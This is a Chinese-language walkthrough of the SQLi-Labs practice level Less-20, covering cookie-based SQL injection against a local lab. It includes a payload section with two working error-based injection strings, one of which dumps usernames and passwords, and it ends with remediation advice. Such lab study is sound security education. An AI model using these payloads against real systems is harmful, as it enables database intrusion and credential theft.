# SQLi-Labs | Less-20 Cookie注入 uname
## 一、漏洞简介
登录成功之后，服务端读取Cookie中的uname参数，直接拼入SELECT查询语句，Cookie注入，单引号闭合，报错注入。需要先登录拿到Cookie。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-20/
注入类型：Cookie注入、字符型、单引号闭合、报错注入
## 三、复现步骤
1. 账号admin/admin登录，抓包，获取Cookie：`uname=admin`。
2. 修改Cookie里面uname的值，填入注入payload。
3. 发送请求，后端读取Cookie的uname执行查询，页面报错带出数据。
## 四、Payload
Cookie: `uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
Cookie: `uname=admin' and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) --+`
## 五、漏洞原理
后端SQL：
`SELECT * FROM users WHERE username='$cookee' LIMIT 0,1`
Cookie中的uname可控，直接拼接SQL，没有过滤校验。
## 六、修复方案
1. Cookie敏感内容加密、签名校验，不要直接明文存储身份信息。
2. 查询语句使用预编译，不直接拼接Cookie内容。
3. 过滤Cookie中的特殊符号。
## 七、总结
Less20是Cookie注入，很多开发认为Cookie不可篡改，直接拿来拼SQL，属于典型信任客户端可控数据的漏洞。